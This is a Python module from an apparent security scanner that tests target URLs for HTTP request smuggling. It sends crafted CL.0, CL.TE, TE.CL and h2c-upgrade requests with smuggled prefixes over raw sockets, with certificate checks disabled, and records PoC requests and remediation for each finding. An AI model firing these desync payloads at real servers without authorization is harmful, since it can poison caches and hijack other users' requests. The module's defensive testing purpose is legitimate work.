"""
BugScan ELITE — HTTP/2 Smuggling Engine
CL.0, H2.TE, H2.CL attacks using raw socket HTTP/2 framing.
Also tests HTTP/1.1 desync and cl.te/te.cl variants.
"""
import socket, ssl, struct, logging, time, urllib.parse
from typing import List, Dict

log = logging.getLogger("elite.h2_smuggling")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _raw_h1_socket(host, port, use_ssl=True):
    """Open raw TCP/TLS socket for HTTP/1.1 smuggling."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, port))
        if use_ssl:
            ctx = _ctx()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock
    except: return None

def _send_raw(sock, data):
    try:
        sock.sendall(data if isinstance(data,bytes) else data.encode())
        time.sleep(0.5)
        resp = b""
        sock.settimeout(5)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                resp += chunk
            except: break
        return resp.decode("utf-8","ignore")
    except: return ""

def check_http2_smuggling(targets: List[str]) -> List[Dict]:
    """Test HTTP/2 and HTTP/1.1 smuggling attacks."""
    findings = []

    def F(sev, url, title, **kw):
        d = {"type":"smuggling","bug":"smuggling","severity":sev,"url":url,
             "title":title,"description":title,"ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}
        d.update(kw); return d

    for url in targets[:15]:
        try:
            parsed = urllib.parse.urlparse(url)
            host   = parsed.hostname
            port   = parsed.port or (443 if parsed.scheme=="https" else 80)
            path   = parsed.path or "/"
            use_ssl = parsed.scheme == "https"

            if not host: continue

            # ── Test 1: CL.0 smuggling ─────────────────────────────────
            # Send POST with Content-Length:0 but include body — server reads body as next request
            cl0_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 0\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"GPOST {path} HTTP/1.1\r\n"  # smuggled prefix
                f"Host: {host}\r\n"
                f"\r\n"
            )
            sock = _raw_h1_socket(host, port, use_ssl)
            if sock:
                try:
                    resp = _send_raw(sock, cl0_request)
                    # If server returns 405 Method Not Allowed for GPOST, CL.0 worked
                    if "405" in resp and "GPOST" not in resp[:50]:
                        findings.append(F("critical", url,
                            "HTTP CL.0 smuggling — server processes smuggled request",
                            technique="CL.0",
                            poc=(f"# CL.0 Attack:\n"
                                 f"POST {path} HTTP/1.1\n"
                                 f"Host: {host}\n"
                                 f"Content-Length: 0\n\n"
                                 f"GPOST / HTTP/1.1\nHost: {host}\n\n"),
                            impact="Poison reverse proxy connection — serve malicious responses to other users",
                            remediation="Reject requests where Content-Length:0 with body. Normalize at load balancer."))
                finally:
                    sock.close()

            # ── Test 2: CL.TE (Content-Length takes precedence) ────────
            clte_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"  # smuggled byte
            )
            sock2 = _raw_h1_socket(host, port, use_ssl)
            if sock2:
                try:
                    resp2 = _send_raw(sock2, clte_request)
                    # Second request to detect desync
                    normal_req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                    resp2b = _send_raw(sock2, normal_req)
                    if "GPOST" in resp2b or ("405" in resp2b and "Method" in resp2b):
                        findings.append(F("critical", url,
                            "HTTP CL.TE desync — request smuggling confirmed",
                            technique="CL.TE",
                            poc=(f"POST {path} HTTP/1.1\nHost: {host}\n"
                                 f"Content-Length: 6\nTransfer-Encoding: chunked\n\n"
                                 f"0\n\nG"),
                            impact="Poison backend connections — bypass WAF, hijack requests",
                            remediation="Frontend and backend must agree on request boundaries. Disable TE header passthrough."))
                finally:
                    sock2.close()

            # ── Test 3: TE.CL (Transfer-Encoding takes precedence) ─────
            tecl_request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 3\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"1\r\n"
                f"G\r\n"
                f"0\r\n"
                f"\r\n"
            )
            sock3 = _raw_h1_socket(host, port, use_ssl)
            if sock3:
                try:
                    resp3 = _send_raw(sock3, tecl_request)
                    if resp3 and "400" not in resp3[:20] and len(resp3) > 50:
                        # Server processed chunked — potential TE.CL
                        findings.append(F("high", url,
                            "HTTP TE.CL desync — Transfer-Encoding accepted",
                            technique="TE.CL",
                            poc=(f"POST {path} HTTP/1.1\nHost: {host}\n"
                                 f"Content-Length: 3\nTransfer-Encoding: chunked\n\n"
                                 f"1\nG\n0\n\n"),
                            note="Manual verification required — use Burp HTTP Request Smuggler extension",
                            impact="Request smuggling via TE.CL desync — cache poisoning, WAF bypass",
                            remediation="Normalize Transfer-Encoding at load balancer. Reject ambiguous requests."))
                finally:
                    sock3.close()

            # ── Test 4: H2.TE via HTTP/2 upgrade header ────────────────
            # Send HTTP/1.1 with Upgrade: h2c to detect HTTP/2 upgrade support
            h2c_request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: h2c\r\n"
                f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
                f"Connection: Upgrade, HTTP2-Settings\r\n"
                f"\r\n"
            )
            sock4 = _raw_h1_socket(host, port, use_ssl)
            if sock4:
                try:
                    resp4 = _send_raw(sock4, h2c_request)
                    if "101" in resp4[:50] or "switching protocols" in resp4.lower():
                        findings.append(F("high", url,
                            "HTTP/2 cleartext upgrade (h2c) accepted — H2.TE attack vector",
                            technique="H2.TE via h2c upgrade",
                            poc=(f"curl --http2 -v '{url}' "
                                 f"-H 'Upgrade: h2c' "
                                 f"-H 'HTTP2-Settings: AAMAAABkAAQAAP__'"),
                            impact="H2.TE desync via cleartext HTTP/2 upgrade — request smuggling to backend",
                            remediation="Disable h2c upgrade. Use HTTP/2 over TLS only."))
                finally:
                    sock4.close()

        except Exception as e:
            log.debug(f"[h2_smuggling] {url}: {e}")

    log.info(f"[h2_smuggling] {len(findings)} findings")
    return findings
